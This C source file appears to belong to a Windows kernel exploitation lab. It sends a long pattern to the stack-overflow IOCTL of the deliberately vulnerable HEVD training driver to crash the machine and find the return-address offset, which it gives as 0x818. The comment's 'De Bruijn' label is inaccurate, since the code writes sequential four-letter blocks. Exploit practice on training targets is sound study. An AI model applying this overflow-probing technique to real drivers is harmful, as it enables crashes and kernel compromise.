/*
 * find_offset.c - Send cyclic De Bruijn pattern to HEVD stack overflow
 * to determine exact offset to RIP from crash dump.
 *
 * Build: x86_64-w64-mingw32-gcc -o find_offset.exe find_offset.c -lkernel32 -static -O2
 * Run on Windows VM with HEVD loaded. Will BSOD.
 * Copy C:\Windows\Minidump\*.dmp to Kali and run read_dump.py.
 *
 * For HEVD 3.00 x64 the offset is 0x818 (confirmed for build 17763).
 */
#include <windows.h>
#include <stdio.h>

#define DEVICE    "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL_SOF 0x222003
#define BUF_SIZE  0x900

int main(void) {
    HANDLE h = CreateFileA(DEVICE,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);

    if (h == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device: %lu\n", GetLastError());
        printf("    Is HEVD loaded? Run: sc start HEVD\n");
        return 1;
    }
    printf("[+] Device opened: %p\n", (void*)h);

    /* De Bruijn cyclic pattern — each 4-byte sequence is unique */
    char buf[BUF_SIZE];
    const char *alpha = "abcdefghijklmnopqrstuvwxyz";
    int idx = 0;
    for (int a = 0; a < 26 && idx < BUF_SIZE; a++)
    for (int b = 0; b < 26 && idx < BUF_SIZE; b++)
    for (int c = 0; c < 26 && idx < BUF_SIZE; c++)
    for (int d = 0; d < 26 && idx < BUF_SIZE; d++) {
        if (idx < BUF_SIZE) buf[idx++] = alpha[a];
        if (idx < BUF_SIZE) buf[idx++] = alpha[b];
        if (idx < BUF_SIZE) buf[idx++] = alpha[c];
        if (idx < BUF_SIZE) buf[idx++] = alpha[d];
    }

    DWORD ret = 0;
    printf("[*] Sending %d-byte cyclic pattern to 0x%08X...\n",
           BUF_SIZE, IOCTL_SOF);
    printf("[*] System will BSOD. Check C:\\Windows\\Minidump\\ after reboot.\n");

    DeviceIoControl(h, IOCTL_SOF,
        buf, BUF_SIZE,
        NULL, 0,
        &ret, NULL);

    /* Should not reach here */
    CloseHandle(h);
    return 0;
}
